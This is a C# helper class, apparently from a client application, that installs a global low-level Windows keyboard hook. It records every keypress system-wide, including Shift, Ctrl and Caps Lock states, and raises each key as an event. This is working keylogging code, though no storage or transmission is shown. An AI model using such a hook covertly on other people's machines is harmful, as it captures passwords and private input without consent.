using System;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Runtime.InteropServices;
using System.Text;

namespace CLIENT.Helpers
{
    public static class KeyboardDetector
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int VK_CAPITAL = 0x14;  // Virtual Key Code for Caps Lock
        private const int VK_SHIFT = 0x10;    // Virtual Key Code for Shift
        private const int VK_CONTROL = 0x11;  // Virtual Key Code for Ctrl

        private static IntPtr _hookID = IntPtr.Zero;
        private static LowLevelKeyboardProc _proc;

        public delegate void KeyPressedHandler(string key, bool isShiftPressed, bool isCtrlPressed, bool isCapsLockOn);
        public static event KeyPressedHandler OnKeyPressed;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern int GetKeyState(int nVirtKey);

        public static void Start()
        {
            if (_hookID != IntPtr.Zero) return;

            _proc = HookCallback;
            using (var process = Process.GetCurrentProcess())
            using (var module = process.MainModule)
            {
                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(module.ModuleName), 0);
            }
        }

        public static void Stop()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                ConsoleKey key = (ConsoleKey)vkCode;

                // Check if Caps Lock is on
                bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                // Check if Shift key is pressed
                bool isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

                // Check if Ctrl key is pressed
                bool isCtrlPressed = (GetKeyState(VK_CONTROL) & 0x8000) != 0;

                // Prepare the key string for Shift or Ctrl combinations
                    string keyString = key.ToString();

                if (isShiftPressed)
                {
                    keyString = "Shift + " + keyString;
                }
                else if (isCtrlPressed)
                {
                    keyString = "Ctrl + " + keyString;
                }

                if (keyString == "20")
                {
                    if (isCapsLockOn)
                    {
                        keyString = "Off Capslock"; 
                     } else {
                        keyString = "On Capslock";
                    }
                }
                switch(keyString)
                {
                    case "160":
                    case "161":
                        keyString = "Shift";
                        break;
                    case "162":
                        keyString = "Ctrl";
                        break;
                }
             



                // Fire event with the key, shift, ctrl, and caps lock states
                OnKeyPressed?.Invoke(keyString, isShiftPressed, isCtrlPressed, isCapsLockOn);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}
